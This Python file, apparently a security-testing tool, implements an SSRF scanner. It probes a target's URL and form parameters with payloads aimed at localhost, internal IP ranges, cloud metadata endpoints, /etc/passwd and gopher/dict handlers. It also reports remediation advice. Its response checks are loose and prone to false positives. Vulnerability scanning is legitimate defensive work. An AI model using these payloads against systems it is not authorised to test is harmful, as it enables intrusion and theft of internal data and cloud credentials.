import requests
from typing import List, Dict, Optional
from urllib.parse import urljoin, urlparse, parse_qs
import re
import json
import time
from concurrent.futures import ThreadPoolExecutor
import socket
import ipaddress

class SSRFScanner:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.vulnerabilities = []
        self.params = []
        
        # Common SSRF parameters
        self.ssrf_params = [
            'url', 'path', 'src', 'dest', 'redirect', 'uri', 'path',
            'continue', 'url_path', 'next', 'target', 'rurl', 'destination',
            'redir', 'redirect_uri', 'redirect_url', 'file', 'page', 'folder',
            'style', 'template', 'php_path', 'doc', 'img', 'filename'
        ]
        
        # Common SSRF payloads
        self.ssrf_payloads = [
            # Localhost variations
            'http://localhost',
            'http://localhost:80',
            'http://127.0.0.1',
            'http://127.0.0.1:80',
            'http://[::1]',
            'http://[::1]:80',
            
            # Internal IP ranges
            'http://192.168.0.1',
            'http://10.0.0.1',
            'http://172.16.0.1',
            
            # Cloud metadata endpoints
            'http://169.254.169.254/latest/meta-data/',
            'http://metadata.google.internal/',
            'http://metadata.azure.internal/',
            
            # Protocol handlers
            'file:///etc/passwd',
            'file:///c:/windows/win.ini',
            'dict://localhost:11211/',
            'gopher://localhost:11211/',
            'ldap://localhost:389/',
            
            # DNS rebinding
            'http://0.0.0.0',
            'http://0.0.0.0:80',
            
            # IPv6 variations
            'http://[::]',
            'http://[::]:80',
            'http://[::ffff:127.0.0.1]',
            
            # Encoded variations
            'http://%6c%6f%63%61%6c%68%6f%73%74',
            'http://%6c%6f%63%61%6c%68%6f%73%74:80',
            'http://%31%32%37%2e%30%2e%30%2e%31',
            'http://%31%32%37%2e%30%2e%30%2e%31:80'
        ]

    def scan_ssrf(self) -> Dict[str, List[Dict]]:
        """
        Scan for SSRF vulnerabilities
        """
        results = {
            "vulnerabilities": [],
            "params": [],
            "details": []
        }
        
        try:
            # Find SSRF parameters
            self._find_ssrf_params()
            results["params"] = self.params
            
            # Test each parameter
            with ThreadPoolExecutor(max_workers=10) as executor:
                futures = []
                for param in self.params:
                    futures.append(executor.submit(self._test_parameter, param))
                    
                for future in futures:
                    vulns = future.result()
                    if vulns:
                        results["vulnerabilities"].extend(vulns)
                        
            # Add detailed information
            results["details"] = self._get_scan_details(results)
            
        except Exception as e:
            print(f"Error scanning for SSRF vulnerabilities: {str(e)}")
            
        return results

    def _find_ssrf_params(self) -> None:
        """
        Find potential SSRF parameters
        """
        try:
            response = requests.get(self.target_url)
            content = response.text
            
            # Find URL parameters
            parsed = urlparse(self.target_url)
            if parsed.query:
                query_params = parse_qs(parsed.query)
                for param in query_params:
                    if param.lower() in self.ssrf_params:
                        self.params.append({
                            "url": self.target_url,
                            "method": "GET",
                            "param": param,
                            "type": "url"
                        })
                        
            # Find form parameters
            form_pattern = r'<form[^>]*>.*?</form>'
            forms = re.finditer(form_pattern, content, re.DOTALL)
            
            for form in forms:
                form_html = form.group()
                form_action = re.search(r'action=[\'"]([^\'"]*)[\'"]', form_html)
                form_method = re.search(r'method=[\'"]([^\'"]*)[\'"]', form_html)
                
                if form_action:
                    action = urljoin(self.target_url, form_action.group(1))
                else:
                    action = self.target_url
                    
                method = form_method.group(1).upper() if form_method else 'GET'
                
                # Find input fields
                inputs = re.finditer(r'<input[^>]*name=[\'"]([^\'"]*)[\'"][^>]*>', form_html)
                for input_field in inputs:
                    param = input_field.group(1)
                    if param.lower() in self.ssrf_params:
                        self.params.append({
                            "url": action,
                            "method": method,
                            "param": param,
                            "type": "form"
                        })
                        
        except Exception as e:
            print(f"Error finding SSRF parameters: {str(e)}")

    def _test_parameter(self, param: Dict) -> List[Dict]:
        """
        Test a parameter for SSRF vulnerabilities
        """
        vulnerabilities = []
        
        try:
            for payload in self.ssrf_payloads:
                # Send request
                if param["method"] == "GET":
                    test_url = f"{param['url']}?{param['param']}={payload}"
                    response = requests.get(test_url, timeout=5)
                else:
                    data = {param["param"]: payload}
                    response = requests.post(param["url"], data=data, timeout=5)
                    
                # Check response
                if self._check_ssrf_success(response, payload):
                    vulnerabilities.append({
                        "url": param["url"],
                        "parameter": param["param"],
                        "method": param["method"],
                        "payload": payload,
                        "type": "SSRF",
                        "details": self._get_vulnerability_details(param, payload, response)
                    })
                    
        except Exception as e:
            print(f"Error testing parameter {param['param']}: {str(e)}")
            
        return vulnerabilities

    def _check_ssrf_success(self, response: requests.Response, payload: str) -> bool:
        """
        Check if SSRF payload was successful
        """
        try:
            # Check response content
            content = response.text.lower()
            
            # Check for common SSRF indicators
            indicators = [
                'root:',  # /etc/passwd
                'win.ini',  # Windows system file
                'meta-data',  # Cloud metadata
                'internal',  # Internal services
                'localhost',  # Local services
                '127.0.0.1',  # Local IP
                '192.168',  # Internal network
                '10.0',  # Internal network
                '172.16'  # Internal network
            ]
            
            for indicator in indicators:
                if indicator in content:
                    return True
                    
            # Check for specific file contents
            if 'root:' in content and '/bin/bash' in content:
                return True
                
            # Check for cloud metadata
            if 'meta-data' in content and ('aws' in content or 'azure' in content):
                return True
                
            # Check for internal services
            if any(service in content for service in ['redis', 'memcached', 'mysql']):
                return True
                
        except:
            pass
            
        return False

    def _get_vulnerability_details(self, param: Dict, payload: str, response: requests.Response) -> Dict:
        """
        Get detailed information about the vulnerability
        """
        risk_level = "High"
        description = "SSRF vulnerability detected"
        remediation = "Implement proper URL validation and filtering"
        impact = "Can lead to unauthorized access to internal services and data"
        
        # Check specific vulnerability type
        if 'file://' in payload:
            description = "File access SSRF detected"
            remediation = "Block file:// protocol and validate file paths"
        elif 'metadata' in payload:
            description = "Cloud metadata SSRF detected"
            remediation = "Block access to cloud metadata endpoints"
        elif any(ip in payload for ip in ['127.0.0.1', 'localhost']):
            description = "Local service SSRF detected"
            remediation = "Block access to local services and validate IP addresses"
            
        return {
            "risk_level": risk_level,
            "description": description,
            "remediation": remediation,
            "impact": impact,
            "response_length": len(response.text),
            "response_time": response.elapsed.total_seconds()
        }

    def _get_scan_details(self, results: Dict) -> List[Dict]:
        """
        Generate detailed scan information
        """
        details = []
        
        try:
            # Add summary information
            details.append({
                "total_vulnerabilities": len(results["vulnerabilities"]),
                "total_params": len(results["params"]),
                "scan_time": time.strftime("%Y-%m-%d %H:%M:%S")
            })
            
            # Add vulnerability statistics
            vuln_stats = {
                "GET": len([v for v in results["vulnerabilities"] if v["method"] == "GET"]),
                "POST": len([v for v in results["vulnerabilities"] if v["method"] == "POST"])
            }
            
            details.append({
                "vulnerability_statistics": vuln_stats
            })
            
            # Add risk assessment
            risk_levels = {
                "High": len([v for v in results["vulnerabilities"] if v["details"]["risk_level"] == "High"]),
                "Medium": len([v for v in results["vulnerabilities"] if v["details"]["risk_level"] == "Medium"]),
                "Low": len([v for v in results["vulnerabilities"] if v["details"]["risk_level"] == "Low"])
            }
            
            details.append({
                "risk_assessment": risk_levels
            })
            
        except Exception as e:
            print(f"Error generating scan details: {str(e)}")
            
        return details 